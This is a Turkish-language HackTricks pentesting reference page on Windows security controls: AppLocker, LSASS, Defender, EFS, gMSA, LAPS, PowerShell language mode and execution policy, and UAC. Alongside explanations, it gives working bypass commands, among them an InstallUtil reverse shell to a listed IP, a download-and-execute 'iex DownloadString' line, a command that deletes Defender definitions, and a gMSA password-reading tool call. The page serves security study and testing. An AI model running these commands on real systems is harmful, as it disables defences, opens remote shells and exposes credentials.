# Windows Güvenlik Kontrolleri

{{#include ../banners/hacktricks-training.md}}

## AppLocker Politikası

Bir uygulama beyaz listesi, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamaları veya yürütülebilir dosyaların listesidir. Amaç, ortamı zararlı kötü amaçlı yazılımlardan ve bir organizasyonun belirli iş ihtiyaçlarıyla uyumlu olmayan onaylanmamış yazılımlardan korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft'un **uygulama beyaz listeleme çözümüdür** ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği üzerinde kontrol sağlar**. Yürütülebilir dosyalar, betikler, Windows yükleyici dosyaları, DLL'ler, paketlenmiş uygulamalar ve paketlenmiş uygulama yükleyicileri üzerinde **ince ayar kontrolü** sağlar.\
Organizasyonların **cmd.exe ve PowerShell.exe'yi engellemesi** ve belirli dizinlere yazma erişimi sağlaması yaygındır, **ancak bunların hepsi atlatılabilir**.

### Kontrol

Hangi dosyaların/uzantıların kara listeye alındığını/beyaz listeye alındığını kontrol edin:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Bu kayıt defteri yolu, AppLocker tarafından uygulanan yapılandırmaları ve politikaları içerir ve sistemdeki mevcut kural setini gözden geçirme imkanı sağlar:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Politikasını atlamak için **Yazılabilir klasörler**: Eğer AppLocker, `C:\Windows\System32` veya `C:\Windows` içindeki herhangi bir şeyi çalıştırmaya izin veriyorsa, bunu **atlamak** için kullanabileceğiniz **yazılabilir klasörler** vardır.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Yaygın olarak **güvenilir** [**"LOLBAS's"**](https://lolbas-project.github.io/) ikili dosyaları, AppLocker'ı atlatmak için de yararlı olabilir.
- **Kötü yazılmış kurallar da atlatılabilir**
- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, istediğiniz herhangi bir yere **`allowed`** adında bir **klasör oluşturabilirsiniz** ve bu izinli olacaktır.
- Kuruluşlar genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** yürütülebilir dosyasını **engellemeye** odaklanır, ancak **diğer** [**PowerShell yürütülebilir konumlarını**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) unutur, örneğin `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe`.
- **DLL uygulaması çok nadiren etkinleştirilir** çünkü sistem üzerinde ek bir yük oluşturabilir ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı yüksektir. Bu nedenle, **DLL'leri arka kapı olarak kullanmak AppLocker'ı atlatmaya yardımcı olacaktır**.
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak **Powershell** kodunu herhangi bir süreçte çalıştırabilir ve AppLocker'ı atlatabilirsiniz. Daha fazla bilgi için kontrol edin: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Kimlik Bilgileri Depolama

### Güvenlik Hesapları Yöneticisi (SAM)

Yerel kimlik bilgileri bu dosyada mevcuttur, şifreler hashlenmiştir.

### Yerel Güvenlik Otoritesi (LSA) - LSASS

**Kimlik bilgileri** (hashlenmiş) bu alt sistemin **belleğinde** **kaydedilir**.\
**LSA**, yerel **güvenlik politikasını** (şifre politikası, kullanıcı izinleri...), **kimlik doğrulama**, **erişim jetonları**... yönetir.\
LSA, sağlanan kimlik bilgilerini **SAM** dosyasında (yerel giriş için) **kontrol edecek** ve bir alan kullanıcısını kimlik doğrulamak için **alan denetleyicisi** ile **iletişim kuracaktır**.

**Kimlik bilgileri**, **işlem LSASS** içinde **kaydedilir**: Kerberos biletleri, NT ve LM hashleri, kolayca çözülebilen şifreler.

### LSA gizli bilgileri

LSA, diske bazı kimlik bilgilerini kaydedebilir:

- Aktif Dizin'in bilgisayar hesabının şifresi (ulaşılamayan alan denetleyicisi).
- Windows hizmetlerinin hesaplarının şifreleri
- Zamanlanmış görevler için şifreler
- Daha fazlası (IIS uygulamalarının şifresi...)

### NTDS.dit

Bu, Aktif Dizin'in veritabanıdır. Sadece Alan Denetleyicileri'nde mevcuttur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde mevcut olan bir antivirüstür. **`WinPEAS`** gibi yaygın pentesting araçlarını **engeller**. Ancak, bu korumaları **atlatmanın yolları** vardır.

### Kontrol

**Defender**'ın **durumunu** kontrol etmek için PS cmdlet **`Get-MpComputerStatus`** komutunu çalıştırabilirsiniz (aktif olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerine bakın):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bunu listelemek için ayrıca şunu çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Şifreli Dosya Sistemi (EFS)

EFS, dosyaları **şifreleme** yoluyla güvence altına alır ve **Dosya Şifreleme Anahtarı (FEK)** olarak bilinen **simetrik anahtar** kullanır. Bu anahtar, kullanıcının **açık anahtarı** ile şifrelenir ve şifreli dosyanın $EFS **alternatif veri akışında** saklanır. Şifre çözme gerektiğinde, kullanıcının dijital sertifikasının karşılık gelen **özel anahtarı** $EFS akışından FEK'yi çözmek için kullanılır. Daha fazla ayrıntı [burada](https://en.wikipedia.org/wiki/Encrypting_File_System) bulunabilir.

**Kullanıcı başlatması olmadan şifre çözme senaryoları** şunları içerir:

- Dosyalar veya klasörler, [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi bir EFS dosya sistemine taşındığında, otomatik olarak şifreleri çözülür.
- SMB/CIFS protokolü üzerinden ağda gönderilen şifreli dosyalar, iletimden önce şifreleri çözülür.

Bu şifreleme yöntemi, sahibine şifreli dosyalara **şeffaf erişim** sağlar. Ancak, sahibin şifresini değiştirmek ve oturum açmak, şifre çözme izni vermez.

**Ana Noktalar**:

- EFS, kullanıcının açık anahtarı ile şifrelenmiş simetrik bir FEK kullanır.
- Şifre çözme, FEK'ye erişmek için kullanıcının özel anahtarını kullanır.
- FAT32'ye kopyalama veya ağ iletimi gibi belirli koşullar altında otomatik şifre çözme gerçekleşir.
- Şifreli dosyalar, ek adımlar olmadan sahibine erişilebilir.

### EFS bilgilerini kontrol et

Bir **kullanıcının** bu **hizmeti** kullanıp kullanmadığını kontrol etmek için bu yolun var olup olmadığını kontrol edin: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Dosyaya **kimlerin** **erişimi** olduğunu kontrol etmek için cipher /c \<file>\
Ayrıca, bir klasör içinde `cipher /e` ve `cipher /d` komutlarını kullanarak tüm dosyaları **şifreleyebilir** ve **şifre çözebilirsiniz**.

### EFS dosyalarını şifre çözme

#### Yetki Sistemi Olmak

Bu yöntem, **kurban kullanıcının** ana bilgisayar içinde bir **işlem** çalıştırmasını gerektirir. Eğer durum buysa, `meterpreter` oturumları kullanarak kullanıcının işlem token'ını taklit edebilirsiniz (`incognito`'dan `impersonate_token`). Ya da sadece kullanıcının işlemine `migrate` yapabilirsiniz.

#### Kullanıcının şifresini bilmek

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Grup Yönetilen Hizmet Hesapları (gMSA)

Microsoft, IT altyapılarındaki hizmet hesaplarının yönetimini basitleştirmek için **Grup Yönetilen Hizmet Hesapları (gMSA)** geliştirmiştir. Geleneksel hizmet hesaplarının genellikle "**Şifre asla süresi dolmaz**" ayarı etkinken, gMSA'lar daha güvenli ve yönetilebilir bir çözüm sunar:

- **Otomatik Şifre Yönetimi**: gMSA'lar, alan veya bilgisayar politikasına göre otomatik olarak değişen karmaşık, 240 karakterli bir şifre kullanır. Bu süreç, Microsoft'un Anahtar Dağıtım Servisi (KDC) tarafından yönetilir ve manuel şifre güncellemeleri gereksiz hale gelir.
- **Gelişmiş Güvenlik**: Bu hesaplar kilitlenmelere karşı bağışık olup, etkileşimli oturum açmak için kullanılamaz, bu da güvenliklerini artırır.
- **Birden Fazla Ana Bilgisayar Desteği**: gMSA'lar, birden fazla ana bilgisayar arasında paylaşılabilir, bu da onları birden fazla sunucuda çalışan hizmetler için ideal hale getirir.
- **Zamanlanmış Görev Yeteneği**: Yönetilen hizmet hesaplarının aksine, gMSA'lar zamanlanmış görevlerin çalıştırılmasını destekler.
- **Basitleştirilmiş SPN Yönetimi**: Sistem, bilgisayarın sAMaccount ayrıntıları veya DNS adı değiştiğinde Hizmet Prensip Adını (SPN) otomatik olarak güncelleyerek SPN yönetimini basitleştirir.

gMSA'ların şifreleri, LDAP özelliği _**msDS-ManagedPassword**_ içinde saklanır ve Alan Denetleyicileri (DC'ler) tarafından her 30 günde bir otomatik olarak sıfırlanır. Bu şifre, [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen şifreli bir veri bloğudur ve yalnızca yetkili yöneticiler ve gMSA'ların kurulu olduğu sunucular tarafından alınabilir, bu da güvenli bir ortam sağlar. Bu bilgilere erişmek için, LDAPS gibi güvenli bir bağlantı gereklidir veya bağlantı 'Sealing & Secure' ile kimlik doğrulaması yapılmalıdır.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)

Bu şifreyi [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)** ile okuyabilirsiniz:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Bu yazıda daha fazla bilgi bulun**](https://cube0x0.github.io/Relaying-for-gMSA/)

Ayrıca, **gMSA**'nın **şifresini** **okumak** için bir **NTLM relay saldırısı** gerçekleştirme hakkında bu [web sayfasını](https://cube0x0.github.io/Relaying-for-gMSA/) kontrol edin.

## LAPS

**Yerel Yönetici Şifre Çözümü (LAPS)**, [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) üzerinden indirilebilir, yerel Yönetici şifrelerinin yönetimini sağlar. Bu şifreler, **rastgele**, benzersiz ve **düzenli olarak değiştirilen** şifrelerdir ve merkezi olarak Active Directory'de saklanır. Bu şifrelere erişim, yetkili kullanıcılar için ACL'ler aracılığıyla kısıtlanmıştır. Yeterli izinler verildiğinde, yerel yönetici şifrelerini okuma yeteneği sağlanır.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Kısıtlı Dil Modu

PowerShell [**Kısıtlı Dil Modu**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **PowerShell'i etkili bir şekilde kullanmak için gereken birçok özelliği** kısıtlar, örneğin COM nesnelerini engelleme, yalnızca onaylı .NET türlerine, XAML tabanlı iş akışlarına, PowerShell sınıflarına ve daha fazlasına izin verme gibi.

### **Kontrol Et**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Atlatma
```bash
#Easy bypass
Powershell -version 2
```
Mevcut Windows'ta bu Bypass çalışmayacak ama [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Bunu derlemek için** **şunları yapmanız gerekebilir** **:** _**Bir Referans Ekle**_ -> _Gözat_ -> _Gözat_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` ekleyin ve **projeyi .Net4.5'e değiştirin**.

#### Doğrudan bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Ters kabuk:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS Execution Policy

Varsayılan olarak **restricted** olarak ayarlanmıştır. Bu politikayı aşmanın ana yolları:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Daha fazlasını [burada](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) bulabilirsiniz.

## Güvenlik Destek Sağlayıcı Arayüzü (SSPI)

Kullanıcıları kimlik doğrulamak için kullanılabilecek API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmaktan sorumludur. Bunun için tercih edilen yöntem Kerberos'tur. Ardından SSPI, hangi kimlik doğrulama protokolünün kullanılacağını müzakere eder, bu kimlik doğrulama protokolleri Güvenlik Destek Sağlayıcıları (SSP) olarak adlandırılır ve her Windows makinesinde bir DLL biçiminde bulunur ve her iki makinenin de iletişim kurabilmesi için aynı protokolü desteklemesi gerekir.

### Ana SSP'ler

- **Kerberos**: Tercih edilen
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleri
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP, MD5 hash biçiminde şifre
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü müzakere etmek için kullanılır (Kerberos veya NTLM, varsayılan olan Kerberos'tur)
- %windir%\Windows\System32\lsasrv.dll

#### Müzakere birkaç yöntem veya sadece bir tane sunabilir.

## UAC - Kullanıcı Hesabı Kontrolü

[Kullanıcı Hesabı Kontrolü (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için onay istemi** sağlayan bir özelliktir.

{{#ref}}
windows-security-controls/uac-user-account-control.md
{{#endref}}

{{#include ../banners/hacktricks-training.md}}
